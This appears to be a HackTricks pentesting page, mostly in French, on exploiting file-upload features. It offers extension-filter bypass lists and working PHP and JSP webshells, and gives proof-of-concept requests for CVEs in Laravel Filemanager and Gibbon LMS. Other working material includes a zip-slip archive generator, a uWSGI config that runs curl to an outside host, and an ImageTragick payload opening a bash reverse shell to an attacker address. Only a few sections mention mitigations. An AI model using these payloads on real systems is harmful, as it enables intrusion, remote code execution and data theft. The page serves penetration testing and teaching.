# Téléversement de fichiers

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie générale de téléversement de fichiers

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Contourner les vérifications d'extensions de fichier

1. Si applicable, **vérifiez** les **extensions précédentes.** Testez-les aussi en utilisant des **lettres MAJUSCULES** : _pHp, .pHP5, .PhAr ..._
2. _Vérifiez en **ajoutant une extension valide avant** l'extension d'exécution (utilisez aussi les extensions précédentes) :_
- _file.png.php_
- _file.png.Php5_
3. Essayez d'ajouter des **caractères spéciaux à la fin.** Vous pouvez utiliser Burp pour **bruteforcer** tous les caractères **ASCII** et **Unicode**. (_Note : vous pouvez aussi essayer d'utiliser les **extensions** mentionnées précédemment_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Essayez de contourner les protections en **trompant le parser d'extension** côté serveur avec des techniques comme le **doublage** de l'**extension** ou l'**ajout de données inutiles** (octets **null**) entre les extensions. _Vous pouvez aussi utiliser les **extensions** précédentes pour préparer un meilleur payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Ajoutez **une autre couche d'extensions** au contrôle précédent :
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Essayez de mettre l'**extension d'exécution avant l'extension valide** et espérez que le serveur est mal configuré. (utile pour exploiter des misconfigurations Apache où tout fichier contenant l'extension **.php**, même s'il ne se termine pas forcément par .php, exécutera du code) :
- _ex: file.php.png_
7. Utilisation des **NTFS alternate data stream (ADS)** sous **Windows**. Dans ce cas, un caractère deux-points ":" sera inséré après une extension interdite et avant une extension autorisée. En conséquence, un **fichier vide avec l'extension interdite** sera créé sur le serveur (ex. "file.asax:.jpg”). Ce fichier peut être édité plus tard en utilisant d'autres techniques comme son short filename. Le motif "**::$data**” peut aussi être utilisé pour créer des fichiers non vides. Par conséquent, ajouter un caractère point après ce motif peut aussi être utile pour contourner des restrictions supplémentaires (ex. "file.asp::$data.”)
8. Essayez de dépasser les limites de longueur du nom de fichier. L'extension valide est tronquée. Et le PHP malveillant reste. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pré-2.9.1 (.php. point final) – CVE-2024-21546

Certains upload handlers tronquent ou normalisent les caractères de point finaux dans le nom de fichier enregistré. Dans UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions antérieures à 2.9.1, vous pouvez contourner la validation d'extension en :

- Utilisant un MIME image valide et l'en-tête magique correspondant (par ex., le header PNG `\x89PNG\r\n\x1a\n`).
- Nommant le fichier uploadé avec une extension PHP suivie d'un point, ex. `shell.php.`.
- Le serveur supprime le point final et conserve `shell.php`, qui s'exécutera s'il est placé dans un répertoire servi par le web (espace de stockage public par défaut comme `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Ensuite, accédez au chemin enregistré (typique dans Laravel + LFM) :
```
GET /storage/files/0xdf.php?cmd=id
```
Mesures d'atténuation :
- Mettre à jour unisharp/laravel-filemanager vers ≥ 2.9.1.
- Appliquer des allowlists strictes côté serveur et re-valider le nom de fichier persistant.
- Servir les fichiers téléversés depuis des emplacements non exécutables.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page cold also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Trouver une vulnérabilité permettant de **renommer** le fichier déjà téléversé (pour changer l'extension).
- Find a **Local File Inclusion** vulnerability to execute the backdoor.
- **Possible Information disclosure**:
1. Téléverser **plusieurs fois** (et en **même temps**) le **même fichier** avec le **même nom**
2. Téléverser un fichier avec le **nom** d'un **fichier** ou **dossier** qui **existe déjà**
3. Téléverser un fichier nommé "." , "..", ou "…". Par exemple, sous Apache sur **Windows**, si l'application enregistre les fichiers téléversés dans le répertoire "/www/uploads/", le nom de fichier "." créera un fichier appelé "uploads" dans le répertoire "/www/".
4. Téléverser un fichier difficile à supprimer comme **"…:.jpg"** sur **NTFS**. (Windows)
5. Téléverser un fichier sous **Windows** avec des **caractères invalides** tels que `|<>*?”` dans son nom. (Windows)
6. Téléverser un fichier sous **Windows** en utilisant des noms **réservés** (**interdits**) tels que CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, et LPT9.
- Essayez aussi de **téléverser un exécutable** (.exe) ou un **.html** (moins suspect) qui **exécutera du code** lorsqu'il sera accidentellement ouvert par la victime.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'exécution du payload se produit lors de l'analyse du fichier de configuration. Pour que la configuration soit activée et parsée, le processus uWSGI doit soit être redémarré (éventuellement après un crash ou à cause d'une attaque de Denial of Service), soit le fichier doit être configuré en auto-reload. La fonctionnalité d'auto-reload, si elle est activée, recharge le fichier à des intervalles spécifiés lorsqu'elle détecte des changements.

Il est crucial de comprendre la nature laxiste de l'analyse des fichiers de configuration de uWSGI. Plus précisément, le payload évoqué peut être inséré dans un fichier binaire (comme une image ou un PDF), élargissant ainsi la portée des exploitations possibles.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Un endpoint non authentifié dans Gibbon LMS permet un arbitrary file write à l'intérieur du web root, conduisant à une pre-auth RCE en déposant un fichier PHP. Versions vulnérables : jusqu'à et y compris 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Paramètres requis :
- `img`: chaîne de type data-URI : `[mime];[name],[base64]` (le serveur ignore le type/le nom, décode en base64 la partie finale)
- `path`: nom de fichier de destination relatif au répertoire d'installation de Gibbon (par ex., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: n'importe quelle valeur non vide est acceptée (par ex., `0000000001`)

PoC minimal pour écrire et relire un fichier:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Téléverser un webshell minimal et exécuter des commandes :
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Remarques :
- Le handler exécute `base64_decode($_POST["img"])` après l'avoir scindé par `;` et `,`, puis écrit les octets dans `$absolutePath . '/' . $_POST['path']` sans valider l'extension/le type.
- Le code résultant s'exécute en tant qu'utilisateur du service web (par ex., XAMPP Apache on Windows).

Les références pour ce bug incluent l'avis usd HeroLab et l'entrée NVD. Voir la section References ci-dessous.

## **Astuce wget File Upload/SSRF**

Dans certaines occasions vous pouvez constater qu'un serveur utilise **`wget`** pour **télécharger des fichiers** et que vous pouvez **indiquer** l'**URL**. Dans ces cas, le code peut vérifier que l'extension des fichiers téléchargés fait partie d'une whitelist afin de s'assurer que seuls des fichiers autorisés seront téléchargés. Cependant, **cette vérification peut être contournée.**\
La **longueur maximale** d'un **nom de fichier** en **linux** est **255**, cependant, **wget** tronque les noms de fichiers à **236** caractères. Vous pouvez **télécharger un fichier nommé "A"*232+".php"+".gif"**, ce nom passera la **vérification** (dans cet exemple **".gif"** est une extension **valide**) mais `wget` va **renommer** le fichier en **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Notez que **une autre option** à laquelle vous pouvez penser pour contourner cette vérification est de faire en sorte que le **HTTP server redirige vers un fichier différent**, de sorte que l'URL initiale contournera la vérification puis wget téléchargera le fichier redirigé avec le nouveau nom. Cela **ne fonctionnera pas** **à moins que** wget soit utilisé avec le **paramètre** `--trust-server-names` car **wget téléchargera la page redirigée avec le nom du fichier indiqué dans l'URL d'origine**.

### Échapper au répertoire d'upload via NTFS junctions (Windows)

(Pour cette attaque vous aurez besoin d'un accès local à la machine Windows) Lorsque les uploads sont stockés dans des sous-dossiers par utilisateur sur Windows (p. ex., C:\Windows\Tasks\Uploads\<id>\) et que vous contrôlez la création/suppression de ce sous-dossier, vous pouvez le remplacer par un directory junction pointant vers un emplacement sensible (p. ex., le webroot). Les uploads suivants seront écrits dans le chemin cible, permettant l'exécution de code si la cible interprète du code côté serveur.

Exemple de flux pour rediriger les uploads vers le XAMPP webroot :
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Remarques
- mklink /J crée une jonction de répertoire NTFS (reparse point). Le compte du serveur web doit suivre la jonction et avoir la permission d'écriture dans la destination.
- Cela redirige des écritures de fichiers arbitraires ; si la destination exécute des scripts (PHP/ASP), cela devient RCE.
- Défenses : ne pas autoriser des répertoires racine d'upload modifiables par un attaquant sous C:\Windows\Tasks ou similaire ; bloquer la création de jonctions ; valider les extensions côté serveur ; stocker les uploads sur un volume séparé ou avec des ACLs deny-execute.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Certains handlers d'upload/ingest écrivent le corps brut de la requête vers un chemin du système de fichiers construit à partir de paramètres de requête contrôlés par l'utilisateur. Si le handler prend aussi en charge Content-Encoding: gzip et ne canonicalise/valide pas le chemin de destination, vous pouvez combiner directory traversal avec une gzipped payload pour écrire des octets arbitraires dans un répertoire servi par le web et obtenir RCE (par ex., déposer un JSP sous Tomcat’s webapps).

Generic exploitation flow:
- Préparez votre payload côté serveur (par ex., minimal JSP webshell) et gzip-comprimez les octets.
- Envoyez un POST où un paramètre de chemin (par ex., token) contient du path traversal permettant d'échapper au dossier prévu, et file indique le nom de fichier à persister. Mettez Content-Type: application/octet-stream et Content-Encoding: gzip ; le body est la payload compressée.
- Accédez au fichier écrit pour déclencher l'exécution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Ensuite, déclenchez :
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notes
- Les chemins cibles varient selon l'installation (p.ex., /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ dans certaines stacks). Tout dossier exposé sur le web qui exécute JSP fonctionnera.
- L'extension Hackvertor de Burp Suite peut produire un corps gzip correct à partir de votre payload.
- Ceci est un pattern pur pré-auth d'écriture de fichier arbitraire → RCE ; il ne repose pas sur multipart parsing.

Mitigations
- Dérivez les destinations d'upload côté serveur ; ne faites jamais confiance aux fragments de chemin fournis par les clients.
- Canonicalisez et imposez que le chemin résolu reste à l'intérieur d'un répertoire de base sur liste autorisée.
- Stockez les uploads sur un volume non exécutable et refusez l'exécution de scripts depuis des chemins en écriture.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) est un outil puissant conçu pour aider les Pentesters et Bug Hunters à tester les mécanismes d'upload de fichiers. Il exploite diverses techniques de bug bounty pour simplifier le processus d'identification et d'exploitation des vulnérabilités, garantissant des évaluations approfondies des applications web.

### Corrupting upload indices with snprintf quirks (historical)

Certains handlers d'upload legacy qui utilisent `snprintf()` ou similaire pour construire des tableaux multi-fichiers à partir d'un upload mono-fichier peuvent être trompés en falsifiant la structure `_FILES`. En raison d'incohérences et de troncatures du comportement de `snprintf()`, un upload unique soigneusement conçu peut apparaître comme plusieurs fichiers indexés côté serveur, perturbant la logique qui suppose une forme stricte (p.ex., le traiter comme un upload multi-fichiers et emprunter des branches non sécurisées). Bien que niche aujourd'hui, ce pattern d'“index corruption” réapparaît parfois dans des CTFs et des bases de code plus anciennes.

## De File upload vers d'autres vulnérabilités

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Uploadez une archive contenant des symlinks (soft links) vers d'autres fichiers ; ensuite, en accédant aux fichiers décompressés vous accéderez aux fichiers liés :
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Décompresser dans différents dossiers

La création inattendue de fichiers dans des répertoires lors de la décompression est un problème important. Malgré l'hypothèse initiale selon laquelle cette configuration pourrait empêcher l'exécution de commandes au niveau OS via malicious file uploads, la prise en charge de la compression hiérarchique et la possibilité de traversée de répertoires du format d'archive ZIP peuvent être exploitées. Cela permet aux attaquants de contourner les restrictions et de s'échapper des répertoires d'upload sécurisés en manipulant la fonctionnalité de décompression de l'application ciblée.

Un automated exploit pour créer de tels fichiers est disponible sur [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). L'utilitaire peut être utilisé comme suit :
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
De plus, le **symlink trick with evilarc** est une option. Si l'objectif est de cibler un fichier comme `/flag.txt`, un symlink vers ce fichier doit être créé sur votre système. Cela garantit qu'evilarc ne rencontrera pas d'erreurs lors de son exécution.

Voici un exemple de code Python utilisé pour créer un fichier zip malveillant :
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Pour plus de détails **consultez l'article original sur**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Le code PHP est écrit pour exécuter des commandes transmises via la variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Plusieurs fichiers sont créés et une archive zip est assemblée contenant ces fichiers.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Les noms des fichiers à l'intérieur du zip sont modifiés en utilisant vi ou un éditeur hexadécimal, remplaçant "xxA" par "../" pour traverser les répertoires.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Téléversez ce contenu avec une extension image pour exploiter la vulnérabilité **(ImageMagick , 7.0.1-1)** (à partir de l'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incrustation d'une PHP Shell dans un PNG

L'incrustation d'une PHP shell dans le chunk IDAT d'un fichier PNG peut contourner efficacement certaines opérations de traitement d'images. Les fonctions `imagecopyresized` et `imagecopyresampled` de PHP-GD sont particulièrement pertinentes dans ce contexte, car elles sont couramment utilisées pour redimensionner et rééchantillonner les images, respectivement. Le fait que la PHP shell incrustée reste intacte malgré ces opérations constitue un avantage important pour certains cas d'utilisation.

Une exploration détaillée de cette technique, incluant sa méthodologie et ses applications potentielles, est fournie dans l'article suivant : ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Cette ressource offre une compréhension approfondie du processus et de ses implications.

Plus d'informations : [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Les polyglot files servent d'outil unique en cybersécurité, agissant comme des caméléons pouvant valablement exister dans plusieurs formats de fichiers simultanément. Un exemple intéressant est un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un hybride qui fonctionne à la fois comme un GIF et comme une archive RAR. Ces fichiers ne se limitent pas à cette association ; des combinaisons comme GIF et JS ou PPT et JS sont également possibles.

L'utilité principale des polyglot files réside dans leur capacité à contourner les mesures de sécurité qui filtrent les fichiers selon leur type. Dans de nombreuses applications, la pratique courante consiste à autoriser uniquement certains types de fichiers pour l'upload — comme JPEG, GIF ou DOC — afin de réduire le risque lié à des formats potentiellement dangereux (par ex., JS, PHP ou fichiers Phar). Cependant, un polyglot, en respectant les critères structurels de plusieurs types de fichiers, peut discrètement contourner ces restrictions.

Malgré leur adaptabilité, les polyglots rencontrent des limites. Par exemple, bien qu'un polyglot puisse incarner simultanément un fichier PHAR (PHp ARchive) et un JPEG, la réussite de son upload peut dépendre des politiques d'extensions de la plateforme. Si le système est strict sur les extensions autorisées, la simple dualité structurelle d'un polyglot peut ne pas suffire à garantir son upload.

Plus d'informations : [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Comment éviter la détection du type de fichier en uploadant un fichier JSON valide même si ce n'est pas autorisé, en le faisant passer pour un PDF (techniques tirées de **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**) :

- **`mmmagic` library** : Tant que les octets magiques `%PDF` se trouvent dans les 1024 premiers octets, il est considéré comme valide (voir exemple dans l'article)
- **`pdflib` library** : Ajouter un faux format PDF à l'intérieur d'un champ du JSON afin que la library le considère comme un pdf (voir exemple dans l'article)
